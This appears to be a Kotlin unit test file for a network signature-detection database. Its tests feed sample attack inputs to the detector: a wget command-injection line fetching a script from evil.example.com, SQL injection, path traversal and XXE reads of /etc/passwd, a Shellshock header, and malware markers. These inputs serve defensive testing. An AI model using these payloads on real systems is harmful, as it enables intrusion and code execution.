package com.example.packet_analyzer

import org.junit.Assert.*
import org.junit.Test

class SignatureDatabaseTest {

    // SignatureDatabase is a stateless singleton (matchSignatures has no rate/window
    // logic), so there is no reset method and none is needed between tests. Signatures
    // added via addSignature() persist for the JVM lifetime; tests use `.any {}` checks
    // against unique ids rather than exact list sizes to stay robust to that.

    private fun packet(
        protocol: String = "TCP",
        destPort: Int = 0,
        sourcePort: Int = 0,
        destIp: String = "192.0.2.10",
        sourceIp: String = "192.0.2.20",
        httpData: Map<String, Any>? = null,
        domain: String? = null
    ): Map<String, Any> {
        val map = mutableMapOf<String, Any>(
            "protocol" to protocol,
            "destinationPort" to destPort,
            "sourcePort" to sourcePort,
            "destinationIp" to destIp,
            "sourceIp" to sourceIp
        )
        if (httpData != null) map["httpData"] = httpData
        if (domain != null) map["domain"] = domain
        return map
    }

    private fun List<SignatureDatabase.SignatureMatch>.hasSig(id: String) =
        any { it.signature.id == id }

    // ---- Baseline ------------------------------------------------------

    @Test
    fun `benign traffic matches no signatures`() {
        val p = packet(protocol = "TCP", destPort = 12345, sourcePort = 54321)
        val payload = "just a normal, boring log line with nothing interesting in it".toByteArray()
        val result = SignatureDatabase.matchSignatures(p, payload)
        assertTrue(
            "Expected no signature match for benign traffic, got: ${result.map { it.signature.id }}",
            result.isEmpty()
        )
    }

    // ---- MAL-001 Metasploit Meterpreter (PayloadContains) -----------------

    @Test
    fun `Metasploit Meterpreter signature matches payload containing meterpreter marker`() {
        val payload = "some binary junk meterpreter stdapi_fs_stat more junk".toByteArray()
        val result = SignatureDatabase.matchSignatures(packet(), payload)
        assertTrue(result.hasSig("MAL-001"))
    }

    // ---- MAL-002 WannaCry (CompositePattern, matchAll = true -> AND) -------

    @Test
    fun `WannaCry signature matches SMB port with tasksche_exe payload`() {
        val payload = "...tasksche.exe...".toByteArray()
        val p = packet(destPort = 445)
        assertTrue(SignatureDatabase.matchSignatures(p, payload).hasSig("MAL-002"))
    }

    @Test
    fun `WannaCry signature does not match SMB port alone without payload marker`() {
        val payload = "ordinary SMB traffic".toByteArray()
        val p = packet(destPort = 445)
        assertFalse(
            "matchAll=true composite should require both sub-patterns",
            SignatureDatabase.matchSignatures(p, payload).hasSig("MAL-002")
        )
    }

    // ---- MAL-003 Cobalt Strike Beacon (HeaderPattern) ----------------------

    @Test
    fun `Cobalt Strike signature matches spoofed legacy IE user agent`() {
        val p = packet(
            httpData = mapOf(
                "User-Agent" to "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
            )
        )
        assertTrue(SignatureDatabase.matchSignatures(p, null).hasSig("MAL-003"))
    }

    // ---- EXP-001 SQL Injection (UrlPattern) --------------------------------

    @Test
    fun `SQL injection signature matches known SQLi URL fragment`() {
        val p = packet(httpData = mapOf("url" to "/index.php?id=1' OR '1'='1"))
        assertTrue(SignatureDatabase.matchSignatures(p, null).hasSig("EXP-001"))
    }

    @Test
    fun `SQL injection signature does not match benign URL`() {
        val p = packet(httpData = mapOf("url" to "/index.php?id=42"))
        assertFalse(SignatureDatabase.matchSignatures(p, null).hasSig("EXP-001"))
    }

    // ---- EXP-002 Directory Traversal (UrlPattern) --------------------------

    @Test
    fun `directory traversal signature matches path traversal sequence`() {
        val p = packet(httpData = mapOf("url" to "/files/../../etc/passwd"))
        assertTrue(SignatureDatabase.matchSignatures(p, null).hasSig("EXP-002"))
    }

    // ---- EXP-003 RCE Attempt (PayloadContains) -----------------------------

    @Test
    fun `RCE signature matches command injection payload`() {
        val payload = "vulnerable_param=x; wget http://evil.example.com/x.sh".toByteArray()
        assertTrue(SignatureDatabase.matchSignatures(packet(), payload).hasSig("EXP-003"))
    }

    // ---- EXP-004 XXE (PayloadContains) -------------------------------------

    @Test
    fun `XXE signature matches DOCTYPE ENTITY payload`() {
        val payload = "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>".toByteArray()
        assertTrue(SignatureDatabase.matchSignatures(packet(), payload).hasSig("EXP-004"))
    }

    // ---- RECON-001/002/003 Scanner user agents (HeaderPattern) -------------

    @Test
    fun `Nmap signature matches Nmap user agent`() {
        val p = packet(httpData = mapOf("User-Agent" to "Nmap Scripting Engine"))
        assertTrue(SignatureDatabase.matchSignatures(p, null).hasSig("RECON-001"))
    }

    @Test
    fun `Nikto signature matches Nikto user agent`() {
        val p = packet(httpData = mapOf("User-Agent" to "Mozilla/5.00 (Nikto/2.1.6)"))
        assertTrue(SignatureDatabase.matchSignatures(p, null).hasSig("RECON-002"))
    }

    @Test
    fun `SQLMap signature matches sqlmap user agent`() {
        val p = packet(httpData = mapOf("User-Agent" to "sqlmap/1.5.2#stable (http://sqlmap.org)"))
        assertTrue(SignatureDatabase.matchSignatures(p, null).hasSig("RECON-003"))
    }

    @Test
    fun `scanner signatures do not match an ordinary browser user agent`() {
        val p = packet(
            httpData = mapOf(
                "User-Agent" to "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
            )
        )
        val result = SignatureDatabase.matchSignatures(p, null)
        assertFalse(result.hasSig("RECON-001"))
        assertFalse(result.hasSig("RECON-002"))
        assertFalse(result.hasSig("RECON-003"))
    }

    // ---- C2-001 TOR/known malicious IP (IpPattern) -------------------------

    @Test
    fun `known malicious IP signature fires for exact sample IP`() {
        val p = packet(destIp = "185.220.101.0")
        assertTrue(SignatureDatabase.matchSignatures(p, null).hasSig("C2-001"))
    }

    @Test
    fun `known malicious IP signature does not fire for an arbitrary IP`() {
        val p = packet(destIp = "8.8.8.8")
        assertFalse(SignatureDatabase.matchSignatures(p, null).hasSig("C2-001"))
    }

    // ---- C2-002 Known C&C domain (DnsPattern) -------------------------------

    @Test
    fun `known C2 domain signature fires for sample malicious domain`() {
        val p = packet(domain = "www.evil-command-control.net")
        assertTrue(SignatureDatabase.matchSignatures(p, null).hasSig("C2-002"))
    }

    @Test
    fun `known C2 domain signature does not fire for an arbitrary domain`() {
        val p = packet(domain = "www.google.com")
        assertFalse(SignatureDatabase.matchSignatures(p, null).hasSig("C2-002"))
    }

    // ---- C2-003 IRC Bot (CompositePattern) ----------------------------------

    @Test
    fun `IRC bot signature matches IRC port with PRIVMSG payload`() {
        val payload = "PRIVMSG #channel :hello bot".toByteArray()
        val p = packet(destPort = 6667)
        assertTrue(SignatureDatabase.matchSignatures(p, payload).hasSig("C2-003"))
    }

    // ---- EXFIL-001 Base64 Exfiltration (CompositePattern, OR) ---------------

    @Test
    fun `base64 exfiltration signature matches data query parameter`() {
        val p = packet(httpData = mapOf("url" to "/upload?data=abc123"))
        val payload = "short body".toByteArray()
        assertTrue(SignatureDatabase.matchSignatures(p, payload).hasSig("EXFIL-001"))
    }

    // ---- BRUTE-001/002 SSH/RDP port signatures ------------------------------

    @Test
    fun `SSH brute force signature fires for port 22 traffic`() {
        val p = packet(destPort = 22)
        assertTrue(SignatureDatabase.matchSignatures(p, null).hasSig("BRUTE-001"))
    }

    @Test
    fun `RDP brute force signature fires for port 3389 traffic`() {
        val p = packet(destPort = 3389)
        assertTrue(SignatureDatabase.matchSignatures(p, null).hasSig("BRUTE-002"))
    }

    // ---- NET-001 EternalBlue (CompositePattern) -----------------------------

    @Test
    fun `EternalBlue signature matches SMB port with named pipe payload`() {
        val payload = "\\PIPE\\svcctl".toByteArray()
        val p = packet(destPort = 445)
        assertTrue(SignatureDatabase.matchSignatures(p, payload).hasSig("NET-001"))
    }

    // ---- NET-002 Shellshock (HeaderPattern) --------------------------------

    @Test
    fun `Shellshock signature matches bash function definition in user agent`() {
        val p = packet(httpData = mapOf("User-Agent" to "() { :; }; echo vulnerable"))
        assertTrue(SignatureDatabase.matchSignatures(p, null).hasSig("NET-002"))
    }

    // ---- addSignature -------------------------------------------------------

    @Test
    fun `addSignature adds a custom signature that gets matched`() {
        val custom = SignatureDatabase.Signature(
            id = "TEST-SIG-CUSTOM-001",
            name = "Custom Test Signature",
            category = SignatureDatabase.Category.MALWARE,
            severity = AnomalyDetector.Severity.LOW,
            pattern = SignatureDatabase.Pattern.PayloadContains(
                listOf("customthreatmarkerxyz".toByteArray())
            ),
            description = "test signature added at runtime"
        )
        SignatureDatabase.addSignature(custom)

        val payload = "prefix customthreatmarkerxyz suffix".toByteArray()
        assertTrue(SignatureDatabase.matchSignatures(packet(), payload).hasSig("TEST-SIG-CUSTOM-001"))

        val unrelatedPayload = "nothing to see here".toByteArray()
        assertFalse(
            SignatureDatabase.matchSignatures(packet(), unrelatedPayload).hasSig("TEST-SIG-CUSTOM-001")
        )
    }

    // ---- getStatistics --------------------------------------------------

    @Test
    fun `getStatistics reports signature counts by category and severity`() {
        val stats = SignatureDatabase.getStatistics()
        val total = stats["totalSignatures"] as Int
        assertTrue("Expected at least the 18 default signatures, got $total", total >= 18)

        @Suppress("UNCHECKED_CAST")
        val byCategory = stats["byCategory"] as Map<SignatureDatabase.Category, Int>
        assertTrue(byCategory.containsKey(SignatureDatabase.Category.MALWARE))
        assertTrue(byCategory.containsKey(SignatureDatabase.Category.WEB_ATTACK))

        @Suppress("UNCHECKED_CAST")
        val bySeverity = stats["bySeverity"] as Map<AnomalyDetector.Severity, Int>
        assertTrue(bySeverity.containsKey(AnomalyDetector.Severity.CRITICAL))
    }
}
